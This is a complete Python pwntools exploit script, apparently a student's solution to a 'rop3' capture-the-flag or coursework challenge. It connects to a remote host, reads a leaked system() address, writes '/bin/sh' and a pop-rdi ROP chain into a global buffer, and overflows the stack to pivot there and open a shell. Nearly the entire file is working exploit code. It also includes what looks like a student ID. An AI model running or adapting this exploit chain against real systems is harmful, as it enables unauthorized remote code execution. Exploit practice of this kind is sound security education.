from pwn import *

context.log_level = 'DEBUG'
context.arch = 'amd64'

LOCAL = False
debug = False

if LOCAL:
    p = process("./rop3")
    binary = ELF("./rop3")
else:
    p = remote("8.154.20.109", 10102)
    binary = ELF("./rop3")

rop = ROP(binary)

if not LOCAL:
    p.sendlineafter(b"Please input your StudentID:\n", b"3220103784")

# 获取 system 地址
p.recvuntil(b"gift system address: ")
system_addr = int(p.recvline().strip(), 16)
log.info(f"System address: {hex(system_addr)}")

# 获取必要的 gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
leave_ret = rop.find_gadget(['leave', 'ret'])[0]
ret_addr = rop.find_gadget(['ret'])[0]
gbuffer_addr = binary.symbols['gbuffer']

if (debug):
    log.info(f"gadget: {hex(pop_rdi)}, {hex(leave_ret)}, {hex(ret_addr)} gbuffer: {hex(gbuffer_addr)}")

# 构造gbuffer中的payload
payload1 = b"/bin/sh\0" # shellcode
payload1 += p64(pop_rdi) # pop rdi; ret
payload1 += p64(gbuffer_addr) # "/bin/sh"
payload1 += p64(ret_addr) # ret
payload1 += p64(system_addr) # system

# 发送第一个 payload 到 gbuffer
p.sendline(payload1)
log.info(f"First payload sent to gbuffer")

# 构造栈溢出的payload
payload2 = b"A" * 0x40  # 填充到 rbp
payload2 += p64(gbuffer_addr)  # 新的 rbp
payload2 += p64(leave_ret)  # 返回地址设为 leave; ret gadget

# 发送第二个payload
p.recvuntil(b"> ")
p.sendline(payload2)
log.info("Second payload sent for stack migration")

# 获取shell
p.interactive()
